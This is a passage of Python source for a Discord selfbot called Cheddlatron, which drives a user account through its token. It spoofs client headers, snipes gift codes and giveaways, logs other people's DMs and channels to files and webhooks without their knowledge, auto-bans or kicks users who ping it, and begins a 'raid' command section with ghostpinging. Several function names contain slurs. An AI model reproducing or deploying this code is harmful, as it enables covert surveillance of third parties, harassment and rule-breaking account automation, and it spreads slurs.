                else:
                    Timer = None

                console = RetardPresenceConfig.get("Platform")
                if console == "" or console == " " or console[0].lower() == "p":
                    console = "ps5"
                elif console[0].lower() == "x":
                    console = "xbox"
                else:
                    console = "ps5"

                RetardPresenceWebsocketJson = {
                    "op": 3,
                    "d":{
                        "status": Status,
                        "since": 0,
                        "activities": [
                            {
                                "state": Sub_Text,
                                "details": Description,
                                "timestamps": {
                                    "start": Timer
                                },

                                "assets": {
                                    "large_image": Large_Image,
                                    "large_text": Large_Image_Text,
                                    "small_image": Small_Image,
                                    "small_text": Small_Image_Text
                                },
                                "platform": console,
                                "name": Title,
                                "application_id": "1298647912456257557",
                                "flags": 1,
                                "type": 0,
                            }
                        ],
                        "afk": True
                    }
                }
                return RetardPresenceWebsocketJson


    presence = await RetardPresenceBuilder()
    await ws.send_as_json(presence)

start_time = time.time()
async def subscringeguilds(ws):
    large_guilds = [g for g in Cheddlatron.guilds if g.member_count > 100000]
    for guild in large_guilds:
        await ws.send_as_json({"op": 37, "d": {"subscriptions": {f"{guild.id}": {"typing": True,"threads": True,"activities": False,"members": [],"member_updates": False,"channels": {},"thread_member_lists": []}}}})

async def subscringedms(ws):
    r = json.loads(requesters.get('https://discord.com/api/v9/users/@me/channels', headers={'authorization': config_get('token'), 'x-super-properties': getxsuper()}).text)
    for channel in r:
        if channel['type'] == 1:
            try:
                await ws.send_as_json({"op": 13, "d": {"channel_id": f"{channel['id']}"}})
                await asyncio.sleep(0.5)
            except Exception as e:
                print(e)
        else:
            pass

@Cheddlatron.event
async def on_connect():
    try:    
        ws = Cheddlatron._get_websocket()
        await retardpresence()
        asyncio.create_task(subscringeguilds(ws))
        asyncio.create_task(subscringedms(ws))
        headers = {"Authorization": config_get('token'), 'X-Super-Properties': getxsuper()}
        requesters.post("https://discord.com/api/v9/oauth2/authorize?client_id=1298647912456257557&scope=applications.commands", headers=headers, json_data={"permissions":"0","authorize":True,"integration_type":1})       
        terminalui()
        customcmds()
        windowname(0)
        load_custom_aliases()
        notif("Cheddlatron Has Loaded!")
        non_custom_cmds, custom_cmds = commandrecs()
        commands_data = json.dumps({
            'customCmds': custom_cmds,
            'nonCustomCmds': non_custom_cmds
        })
    except Exception as e:
        print(e)
#ON CONNECT------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#logrpc/session------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
fetchedactivity = ""
lastsesh = ""
@Cheddlatron.listen('on_socket_raw_receive')
async def activitycollector(data):
    global lastsesh
    global soundspambool
    if data['t'] == "USER_UPDATE":
        update_profile()
    if data['t'] == "USER_APPLICATION_REMOVE":
        if data['d']['application_id'] == '1298647912456257557':
            headers = {"Authorization": config_get('token'), 'X-Super-Properties': getxsuper()}
            requesters.post("https://discord.com/api/v9/oauth2/authorize?client_id=1298647912456257557&scope=applications.commands", headers=headers, json_data={"permissions":"0","authorize":True,"integration_type":1})
    if data["t"] == "VOICE_STATE_UPDATE" and soundspambool is True and data['d']['member']['user']['id'] == str(Cheddlatron.user.id):
        if data['d']['channel_id'] == None:
            print(data['d'])
            soundspambool = False
    if data["t"] == "GUILD_MEMBERS_CHUNK":
        global fetchedactivity
        def extract_raw_activities(chunk):
            raw_activities_list = []
            presences = chunk.get('d', {}).get('presences', [])
            for presence in presences:
                activities = presence.get('activities', [])
                user_id = presence.get('user', {}).get('id')
                for activity in activities:
                    session_id = activity.get('session_id')
                    application_id = activity.get('application_id')
                    if user_id is not None and session_id is not None and application_id is not None:
                        buttonmeta = requesters.get(f"https://discord.com/api/v9/users/{user_id}/sessions/{session_id}/activities/{application_id}/metadata", headers={"Authorization": config_get('token'), "X-Super-Properties": getxsuper()})
                        activity['metadata'] = buttonmeta.json()
                    raw_activities_list.append(activity)
            return raw_activities_list
        
        parsed = extract_raw_activities(data)
        activities_json = json.dumps(parsed, indent=4)
        fetchedactivity = activities_json

    elif data['t'] == "SESSIONS_REPLACE":
        if config_get('sessionlogger') is True:
            resp = requesters.get("https://discord.com/api/v9/auth/sessions", headers={"Authorization": config_get('token'), "X-Super-Properties": getxsuper()}).json()
            def parse_time(session):
                return datetime.fromisoformat(session["approx_last_used_time"].replace('Z', '+00:00'))
            def get_latest_session(sessions):
                latest_session = max(sessions, key=parse_time)
                return latest_session
            sessions = resp["user_sessions"]
            latest = get_latest_session(sessions)
            latestsesh = latest['id_hash']
            if latestsesh == lastsesh or latestsesh == seshidhash:
                return
            else:
                lastsesh=latestsesh
            timee = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            info = f"ID Hash: {latest['id_hash']}\nDate: {timee}\nOS: {latest['client_info']['os']}\nPlatform: {latest['client_info']['platform']}\nLocation: {latest['client_info']['location']}"
            print(f"{Fore.LIGHTRED_EX}[New Session Detected]{Fore.WHITE}\n{info}")
            notification = Notify()
            notification.application_name = "Cheddlatron Selfbot"
            notification.title = f"New Session Detected"
            notification.message = "Check console for more info!"
            notification.icon = "cheddlatronlogo.ico"
            notification.send()

    elif data['t'] == "GUILD_CREATE":
        ws = Cheddlatron._get_websocket()
        guild = Cheddlatron.get_guild(int(data['d']['id']))
        if guild.member_count > 100000:
            await ws.send_as_json({"op": 37, "d": {"subscriptions": {f"{guild.id}": {"typing": True,"threads": True,"activities": True,"members": [],"member_updates": True,"channels": {},"thread_member_lists": []}}}})

    elif data['t'] == "GUILD_DELETE" or data['t'] == "GUILD_CREATE" or data['t'] == "RELATIONSHIP_REMOVE" or data['t'] == "RELATIONSHIP_ADD":
        friends = requesters.get("https://discord.com/api/v9/users/@me/relationships", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
        guilds = requesters.get("https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
        guildnum = len(guilds)
        guilds = requesters.get("https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
        friends = [record for record in friends if record["type"] != 4 and record["type"] != 3 and record["type"] != 2]
        friendnum = len(friends)
        API.updatenums(guildnum, friendnum)

    elif data['t'] == 'VOICE_STATE_UPDATE':
        if int(data['d']['user_id']) == Cheddlatron.user.id:
            global currentvc
            currentvc = data['d']['channel_id']
        
#logrpc/session------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#SESHID EVENT------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.listen('on_ready')
async def seshidnignignignignog(data):
        global seshid
        global seshidhash
        seshid = data['session_id']
        seshidhash = data['auth_session_id_hash']
        with open("data.txt", "w") as file:
            json.dump(data, file, indent=4)


#SESHID EVENT------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def getExternalToken(url):
    parsed_url = urlparse(url)
    file_path, ext = os.path.splitext(parsed_url.path)
    if parsed_url.netloc in ["cdn.discordapp.com", "media.discordapp.net"] and ext == ".webp":
        response = requested.get(url)
        image = Image.open(BytesIO(response.content))
        buffer = BytesIO()
        image.save(buffer, format="PNG")
        buffer.seek(0)
        headers = {"Authorization": "Client-ID 546c25a59c58ad7"}
        files = {"image": ("Cheddlatron.png", buffer, "image/png")}
        req = requested.post("https://api.imgur.com/3/upload", headers=headers, files=files).json()
        url = req['data']['link']
    elif parsed_url.netloc in ["cdn.discordapp.com", "media.discordapp.net"]:
        payload = {
            "image": url,
            "type": "url",
            "name": f"Cheddlatron{ext}"
        }
        headers = {"Authorization": "Client-ID 546c25a59c58ad7"}
        req = requested.post("https://api.imgur.com/3/upload", headers=headers, json=payload).json()
        url = req['data']['link']
    r = requested.post("https://discord.com/api/v9/applications/356876176465199104/external-assets", headers={"authorization": config_get('token')}, json={
        "urls": [
            url
        ]
    })
    return "mp:" + r.json()[0]["external_asset_path"]


#ON COMMAND------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.before_invoke
async def before_command(ctx):
    if ctx.command.name != ">>":
        await ctx.message.delete()
        Cheddlatron.command_prefix = config_get('prefix')
        if not hasattr(before_command, "commandsdone"):
            before_command.commandsdone = 0
        print(f"{Fore.LIGHTRED_EX}[{get_time()}] Command Used {Fore.LIGHTWHITE_EX}~ {ctx.command.name}" + Fore.RESET)
        before_command.commandsdone += 1
        windowname(before_command.commandsdone)
    else:
        pass
#ON COMMAND------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#ON COMMAND ERROR------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.event
async def on_command_error(ctx, error):
    try:
        try:
            await ctx.message.delete()
        except:
            pass
        heading = "Error"
        cmdname = "ERROR"
        error_str = str(error)
        Cheddlatron.command_prefix = config_get('prefix')
        if isinstance(error, commands.CommandNotFound):
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}The command entered does not exist." + Fore.RESET)
            body = "Command Not Found!"
            await panelmaker(ctx, heading, body, cmdname)
        elif isinstance(error, commands.CheckFailure):
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}You're missing the permissions to execute this command." + Fore.RESET)
            body = "You're missing the permissions to execute this command."
            await panelmaker(ctx,heading,body,cmdname)
        elif isinstance(error, commands.MissingRequiredArgument):
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}You're missing the required argument(s) ({error.param.name}) to execute this command." + Fore.RESET)
            body = f"You're missing the required argument(s) ({error.param.name}) to execute this command."
            await panelmaker(ctx,heading,body,cmdname)
        elif isinstance(error, discord.Forbidden):
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}{error}" + Fore.RESET)
            body = error
            await panelmaker(ctx,heading,body,cmdname)
        elif "Cannot send an empty message" in error_str:
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}Could not send an empty message." + Fore.RESET)
            body = "Could not send an empty message."
            await panelmaker(ctx,heading,body,cmdname)
        elif "ssl" in error_str.lower():
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {error}" + Fore.RESET)
            body = "An SSL issue occured, please try again."
            await panelmaker(ctx,heading,body,cmdname)
            return
        else:
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}{error_str}" + Fore.RESET)
            body = error_str
            await panelmaker(ctx,heading,body,cmdname)
            return
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}An unknown error occurred: {e}" + Fore.RESET)
        body = "An unknown error occurred. Try again later."
        await panelmaker(ctx,heading,body,cmdname)
        asyncio.run(await send_webhook("Bot Command Error", f"An unknown error occurred: {str(e)}. Please check the logs for more details.", config_get('error_webhook_url')))
#ON COMMAND ERROR------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#SESHID EVENT------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.event
async def on_spotify_session_replace(userid, session_id, state, syncid):
    global seshid
    seshid = session_id
#SESHID EVENT------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#ON MESSAGE------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.event
async def on_message(message):
    #try:
        if message.author.id == Cheddlatron.user.id:
            await Cheddlatron.process_commands(message)
        sniper = config_get('nitro_sniper')
        token = config_get('token')
        time = datetime.now().strftime('%H:%M:%S %p')
        dmlogid = setting_get('dmlogid')
        blacklist = config_get('nitro_blacklist_ids')
        serverpingbanlist = setting_get('serverpingban')
        userpingbanlist = setting_get('userpingban')
        serverpingkicklist = setting_get('serverpingkick')
        userpingkicklist = setting_get('userpingkick')
        if blacklist == None:
            blacklist = []
        channel_info = (
            f"{message.channel.name}"
            if isinstance(message.channel, discord.TextChannel)
            else (
                f"Private channel with {message.author.name}"
                if isinstance(message.channel, discord.DMChannel)
                else (
                    f"{message.channel.name}"
                    if isinstance(message.channel, discord.Thread)
                    else ("Unknown Name")
                )
            )
        )

    #NITROSNIPER----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        if sniper:
                if message.guild and int(message.guild.id) in blacklist:
                    pass
                else:
                    start = datetime.now()
                    code_match = re.search(r"(?:https://)?discord\.gift/([a-zA-Z0-9]+)", message.content)
                    if code_match:
                        code = code_match.group(1)
                        req = await redeem_code(code, token)
                        delay = datetime.now() - start
                        delay = str(delay.microseconds)[:3]
                        if 'subscription_plan' in req:
                            status = "Real"
                        elif 'Unknown Gift Code' in req:
                            status = "Invalid"
                        elif 'This gift has been redeemed already.' in req:
                            status = "Already Claimed"
                        if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel):
                            jumpurl = f"discord://-/channels/@me/{message.channel.id}/{message.id}"
                        else:
                            jumpurl = f"discord://-/channels/{message.guild.id}/{message.channel.id}/{message.id}"
                        print(f"{Fore.LIGHTRED_EX}[NITRO SNIPER] ~ {time}{Fore.WHITE}\nCode: discord.gift/{code}\nDelay: {delay}ms\nServer: {message.guild}\nChannel: [{channel_info}]({jumpurl})\nSent By: {message.author.name}\nStatus: {status}")
                        if config_get('webhooknotifs') and config_get('nitro_webhook_url') != "": 
                            if status == "Real":
                                title = "__SNIPED NITRO__"
                                description = f"\n\n**Delay:** {delay}ms\n**Time Sniped:** {time}\n**Server:** {message.guild}\n**Sent By:** {message.author.mention}\n**Code:** discord.gift/{code}\n**Channel:** {channel_info}\n**Message:** [**{channel_info}**]({message.jump_url})\n**Status:** {status}\n\n<@{Cheddlatron.user.id}>"
                            else:
                                title ="__NITRO SNIPER LOG__"
                                description = f"\n\n**Delay:** {delay}ms\n**Time Sniped:** {time}\n**Server:** {message.guild}\n**Sent By:** {message.author.mention}\n**Code:** discord.gift/{code}\n**Channel:** {channel_info}\n**Message:** [**{channel_info}**]({message.jump_url})\n**Status:** {status}"
                            await send_webhook(title,description,config_get('nitro_webhook_url'))
    #NITROSNIPER----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    #PINGLOGGER/AFKMODE/PINGBAN----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        if message.reference:
            try:
                resolved_user = message.reference.resolved.author
            except:
                resolved_user = ""
        if message.reference and message.reference.resolved and resolved_user == Cheddlatron.user or Cheddlatron.user.mention in message.content and message.author.id != Cheddlatron.user.id:
            try:
                if message.author.id in userpingbanlist:
                    if message.guild.me.guild_permissions.ban_members:
                        await message.author.ban(reason="Cheddlatron Ping-Ban")
                    else:
                        pass
                if message.guild.id in serverpingbanlist:
                    if message.guild.me.guild_permissions.ban_members:
                        await message.author.ban(reason="Cheddlatron Ping-Ban")
                    else:
                        pass
                if message.guild.id in serverpingkicklist:
                    if message.guild.me.guild_permissions.kick_members:
                        await message.author.kick(reason="Cheddlatron Ping-Kick")
                    else:
                        pass
                if message.author.id in userpingkicklist:
                    if message.guild.me.guild_permissions.kick_members:
                        await message.author.kick(reason="Cheddlatron Ping-Kick")
                    else:
                        pass
            except:
                pass
            if "Chedmind" in message.content:
                return
            if config_get('pinglogger') == True:
                if message.author == Cheddlatron.user:
                    return
                if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel):
                    jumpurl = f"discord://-/channels/@me/{message.channel.id}/{message.id}"
                else:
                    jumpurl = f"discord://-/channels/{message.guild.id}/{message.channel.id}/{message.id}"
                title = "__Ping Logged!__"
                description = f"**Author:** {message.author.mention}\n**Message:** {message.content}\n**Server:** {message.guild}\n**Channel:** [**{channel_info}**]({message.jump_url})"
                if config_get('pinglogger_webhook_url') != "" and config_get('webhooknotifs'):
                    await send_webhook(title,description,config_get('pinglogger_webhook_url'))
                    url = message.jump_url.split('/')
                print(f"{Fore.LIGHTRED_EX}[PingLogger] ~ {time}{Fore.WHITE}\nAuthor: {message.author.name}\nMessage: {message.content}\nServer: {message.guild}\nChannel: [{channel_info}]({jumpurl})")
            
            if config_get('afkmode') == True:
                afk_msg_length = len(config_get('afkmsg'))
                typing_duration = afk_msg_length * 0.2
                async with message.channel.typing():
                    await asyncio.sleep(typing_duration)
                    await message.reply(config_get('afkmsg'))
                url = f"https://canary.discord.com/api/v9/channels/{message.channel.id}/messages/{message.id}/ack"
                headers = {'authorization': token }
                json_data = {"manual": True, "mention_count": 1}
                requesters.post(url, headers=headers, json_data=json_data)
    #PINGLOGGER/AFKMODE----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    #DMLOGGER----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        if dmlogid is not None and isinstance(message.channel, discord.GroupChannel) == False:
            if isinstance(message.channel, discord.DMChannel):
                try:
                    if message.author.id in dmlogid or message.author.id == Cheddlatron.user.id and message.channel.recipient.id in dmlogid:
                        if message.author.id != Cheddlatron.user.id:
                            if config_get('dmlogger_webhook_url') != "" and config_get('webhooknotifs'):
                                title = "__Direct Message Logged!__"
                                description = f"**Author:** {message.author.mention}\n**Message:** {message.content}\n"
                                description += f"**Channel:** [**Direct Message With {message.author.name}**]({message.jump_url})"
                                await send_webhook(title, description, config_get('dmlogger_webhook_url'))

                            print(f"{Fore.LIGHTRED_EX}[DM Logger] ~ {time}{Fore.WHITE}\nAuthor: {message.author.name}\nMessage: {message.content}\n", end="")
                            print(f"Channel: Direct Message With {message.author.name}\n", end="")

                        chat_style = """
                        <style>
                        .embed {
                            padding: 10px;
                            background-color: #2B2D31;
                            border-radius: 8px;
                            display: flex;
                            border-left-width: 5px;
                            max-width: 500px
                        }

                        .embed-image-container {
                            display: inline-block;
                            padding: 5px;
                            background-color: #2B2D31;
                            border-radius: 8px;
                            max-width: 500px
                        }

                        .embed-content {
                            flex: 1;
                        }

                        .embed-title a {
                            text-decoration: none;
                            color: inherit;
                        }

                        .embed-description {
                            font-size: 0.9em;
                            margin-bottom: 10px;
                        }

                        .embed-media {
                            margin-top: 10px;
                        }

                        .image {
                            max-width: 25%;
                            height: auto;
                        }

                        .videoo {
                            max-width: 25%;
                            height: auto;
                        }

                        .embed-image {
                            max-width: calc(100% - 10px);
                            height: auto;
                            border-radius: 8px;
                        }

                        .embed-video {
                            max-width: calc(100% - 10px);
                            height: auto;
                        }

                        body {
                            background-color: #313338;
                            color: #ffffff;
                            font-family: Arial, sans-serif;
                            margin: 0;
                            padding: 10px;
                        }

                        .timestamp {
                            color: #888888;
                            font-size: 0.8em;
                            margin-left: 5px;
                            margin-right: 5px;
                        }

                        .chat-wrapper {
                            position: relative;
                            overflow-y: auto;
                            padding: 10px;
                        }

                        .chat-container {
                            display: flex;
                            flex-direction: column; 
                        }

                        .message {
                            display: flex;
                            align-items: flex-start;
                            padding-bottom: 10px;
                        }

                        .profile-image {
                            width: 32px;
                            height: 32px;
                            border-radius: 50%;
                            margin-right: 5px;
                        }

                        .message-content {
                            display: flex;
                            flex-direction: column;
                            word-wrap: break-word; 
                        }

                        .message-header {
                            display: flex;
                            align-items: center;
                            width: 100%;
                        }

                        .author {
                            color: #7289da;
                            font-weight: bold;
                        }

                        .audio {
                            width: 100%;
                        }
                        </style>
                        """
                        content = await process_messagee(message)
                        file_path = f'Data/Logs/{message.channel.recipient.name}.html'
                        async with aiofiles.open(file_path, 'a', encoding='utf-8') as file:
                            if os.path.getsize(file_path) == 0:
                                await file.write("<html>")
                                await file.write(chat_style)
                                await file.write("<body>")
                                await file.write('<div class="chat-wrapper">')
                                await file.write('<div class="chat-container">')
                            await file.flush()
                            await file.write(content)
                except:
                    pass

    #DMLOGGER----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    #MSGLOGGER----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        if setting_get('msglogids') is None:
            pass
        else:
            if message.channel.id in setting_get('msglogids'):
                chat_style = """
                <style>
                .embed {
                    padding: 10px;
                    background-color: #2B2D31;
                    border-radius: 8px;
                    display: flex;
                    border-left-width: 5px;
                    max-width: 500px
                }

                .embed-image-container {
                    display: inline-block;
                    padding: 5px;
                    background-color: #2B2D31;
                    border-radius: 8px;
                    max-width: 500px
                }

                .embed-content {
                    flex: 1;
                }

                .embed-title a {
                    text-decoration: none;
                    color: inherit;
                }

                .embed-description {
                    font-size: 0.9em;
                    margin-bottom: 10px;
                }

                .embed-media {
                    margin-top: 10px;
                }

                .image {
                    max-width: 25%;
                    height: auto;
                }

                .videoo {
                    max-width: 25%;
                    height: auto;
                }

                .embed-image {
                    max-width: calc(100% - 10px);
                    height: auto;
                    border-radius: 8px;
                }

                .embed-video {
                    max-width: calc(100% - 10px);
                    height: auto;
                }

                body {
                    background-color: #313338;
                    color: #ffffff;
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 10px;
                }

                .timestamp {
                    color: #888888;
                    font-size: 0.8em;
                    margin-left: 5px;
                    margin-right: 5px;
                }

                .chat-wrapper {
                    position: relative;
                    overflow-y: auto;
                    padding: 10px;
                }

                .chat-container {
                    display: flex;
                    flex-direction: column; 
                }

                .message {
                    display: flex;
                    align-items: flex-start;
                    padding-bottom: 10px;
                }

                .profile-image {
                    width: 32px;
                    height: 32px;
                    border-radius: 50%;
                    margin-right: 5px;
                }

                .message-content {
                    display: flex;
                    flex-direction: column;
                    word-wrap: break-word; 
                }

                .message-header {
                    display: flex;
                    align-items: center;
                    width: 100%;
                }

                .author {
                    color: #7289da;
                    font-weight: bold;
                }

                .audio {
                    width: 100%;
                }
                </style>
                """
                if not os.path.exists(f'Data/Logs/{message.guild.name}~Message_Logs'):
                    os.mkdir(f'Data/Logs/{message.guild.name}~Message_Logs')
                content = await process_messagee(message)
                file_path = f'Data/Logs/{message.guild.name}~Message_Logs/{message.channel.name}.html'
                async with aiofiles.open(file_path, 'a', encoding='utf-8') as file:
                    if os.path.getsize(file_path) == 0:
                        await file.write("<html>")
                        await file.write(chat_style)
                        await file.write("<body>")
                        await file.write('<div class="chat-wrapper">')
                        await file.write('<div class="chat-container">')
                    await file.flush()
                    await file.write(content)
    #except:
    #   pass

#GWSNIPER----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
joinedgwlist = []
@Cheddlatron.listen('on_socket_raw_receive')
async def universalgiveawaybot(data):
    giveawaybotlist = config_get('giveaway_bot_ids')
    blacklist = config_get('giveaway_blacklist_ids')
    if blacklist == None:
        blacklist = []
    time = datetime.now().strftime('%H:%M:%S %p')
    try:
        if data['t'] == 'MESSAGE_CREATE':
                if int(data['d']['author']['id']) in giveawaybotlist or int(data['d']['author']['id']) == 294882584201003009 and config_get('giveaway_sniper') == True:
                    if data['d']['id'] in joinedgwlist:
                        return
                    if int(data['d']['guild_id']) in blacklist:
                        return
                    nonce = ''
                    for i in range(0,19): nonce += str(random.randint(1,9))
                    if len(data['d']['embeds']) > 0:
                        if len(data['d']['components']) > 0:            
                            my13threasonwhy = {'type': 3,
                                'nonce': nonce,
                                'guild_id': data['d']['guild_id'],
                                'channel_id': data['d']['channel_id'],
                                'message_flags': 0,
                                'message_id': data['d']['id'],
                                'application_id': data['d']['author']['id'],
                                'session_id': 'whyhavesessionidwhendonothingwith',
                                'data': {'component_type': data['d']['components'][0]['components'][0]['type'],'custom_id': data['d']['components'][0]['components'][0]['custom_id']}
                                }
                            await asyncio.sleep(int(config_get('giveaway_delay'))) 
                            r = requesters.post('https://canary.discord.com/api/v9/interactions', headers={'authorization': config_get('token')}, json_data=my13threasonwhy)
                            if r.status_code == 204:
                                joinedgwlist.append(data['d']['id'])
                                print(f"{Fore.LIGHTRED_EX}[Entered giveaway]{Fore.RESET} ~ {time}")
                                print(f"Guild ID: {data['d']['guild_id']}")
                                print(f"Message: discord://-/channels/{data['d']['guild_id']}/{data['d']['channel_id']}/{data['d']['id']}")
                                if config_get('webhooknotifs') == True:
                                    server_name = data['d']['guild_id']  
                                    if 'guilds' in data:
                                        for guild in data['guilds']:
                                            if guild['id'] == data['d']['guild_id']:
                                                server_name = guild['name']
                                                break
                                    url = f"https://canary.discord.com/channels/{data['d']['guild_id']}/{data['d']['channel_id']}/{data['d']['id']}"
                                    title = "Giveaway Sniper"
                                    description = f"Link to giveaway: [**Giveaway**]({url})\nJoined at: {time}"
                                    await send_webhook(title,description,config_get('giveaway_webhook_url'))
    except Exception as e:
        pass
#GWSNIPER----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#ON MESSAGE------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def getxsuper():
            os = platform.system()
            browser = "Discord Client"
            osarch = platform.architecture()[0]
            if osarch == '64bit':
                osarch = 'x64'
            elif osarch == '32bit':
                osarch = 'x32'
            current_locale = locale.getdefaultlocale()[0]
            syslocale = current_locale.replace("_", "-")
            osver = platform.version()
            resp = requesters.get("https://raw.githubusercontent.com/Pixens/Discord-Build-Number/main/discord.json")
            data = resp.json()
            cbuild = data.get("client_build_number")
            x = {"os":os,"client_build_number":cbuild, "os_version":osver, "system_locale":syslocale,"browser":browser}
            json_str = json.dumps(x)
            xsuper = base64.b64encode(json_str.encode()).decode()
            return xsuper

#HELP COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def get_command_categories():
    categories = set()  
    for command in Cheddlatron.commands:
        if command.help:
            categories.add(command.help.lower())
    return sorted(categories)

def get_commands(category, num=None):
    commands = set()
    category = category
    sorted_commands = sorted(Cheddlatron.commands, key=lambda x: x.name)
    filtered_commands = [command for command in sorted_commands if command and command.help == category]
    max_panels = len(filtered_commands) // 11 + (1 if len(filtered_commands) % 11 != 0 else 0)
    try:
        if num is None:
            num = 1
        else:
            num = int(num)
    except ValueError:
        num = 1 
    start_index = (num - 1) * 11
    end_index = start_index + 11
    commands_to_return = filtered_commands[start_index:end_index]
    for command in commands_to_return:
        commands.add(f"{command.name}")
    return sorted(commands), max_panels

def format_commands(commands):
    return '\n'.join([f"{config_get('prefix')}{cmd}" for cmd in commands])

def format_catagories(catagories):
    return '\n'.join([f"{config_get('prefix')}help {catagory}" for catagory in catagories])

def is_cmd(cmd):
    cmd = cmd.lower()
    for command in Cheddlatron.commands:
        if command.name == cmd or cmd in [alias.lower() for alias in command.aliases]:
            if command.description is None:
                description = "None"
            else:
                description = command.description
            return True, description
    return False, None

@Cheddlatron.command(description=f"Displays all help panels. \nUsage: {config_get('prefix')}help [panel name/command name] [panel number]", help = "utility")
async def help(ctx, category="None", num=None):
    heading = ""
    body = ""
    cmdname = ""
    comment = ""
    categories = get_command_categories()
    if category == "None" and num is None:
        heading = "Help"
        body = format_catagories(categories)
        cmdname = "help"
        comment = f"Use {config_get('prefix')}help command-name for help on commands!"
        await panelmaker(ctx, heading, body, cmdname, comment)
        return
    isitacmd, description = is_cmd(category)
    if isitacmd:
        heading = category.lower()
        if description == "":
            body = "This command has no description."
        body = description
        cmdname = category.lower()
        comment = "< > Is Required᲼|᲼[ ] Is Optional"
        await panelmaker(ctx, heading, body, cmdname, comment)
        return
    if category.lower() in categories:
        if num:
            commands, max_panels = get_commands(category.lower(), int(num))
            if int(num) < max_panels:
                comment = f"Use {config_get('prefix')}help {category} {int(num)+1} for more"
            else:
                comment = None
        else: 
            commands, max_panels = get_commands(category.lower())
            if 1 < max_panels:
                num = 1
                comment = f"Use {config_get('prefix')}help {category} {int(num)+1} for more"
        if not commands:
            heading = "Error"
            body = "The help panel you are looking for does not exist."
            cmdname = "ERROR"
            await panelmaker(ctx, heading, body, cmdname, comment)
            return
        heading = category.lower()
        body = format_commands(commands)
        cmdname = category.lower()
        await panelmaker(ctx, heading, body, cmdname, comment)
        return
    else:
        heading = "Error"
        body = "The help panel you are looking for does not exist."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname, comment)
        return
#HELP COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#SEARCHING COMMANDS COMMAND------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.command(description=f"Uses the search function to find commands matching the given word. \nUsage: {config_get('prefix')}search <query>", help = "utility")
async def search(ctx, word):
    matching_commands = []

    for command in Cheddlatron.commands:
        if word in command.name:
            matching_commands.append(command.name)

    if matching_commands:
        commands_list = "\n".join(matching_commands)
        heading = f"Commands containing '{word}'"
        body = f"{commands_list}\n"
        cmdname = "Search"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        heading = "ERROR"
        body = f"No commands found containing '{word}'."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
#SEARCHING COMMANDS COMMAND------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#RAID COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.command(description=f"Pings a user then deletes the message to hide it. \nUsage: {config_get('prefix')}ghostping <@user/role>", help="raid")
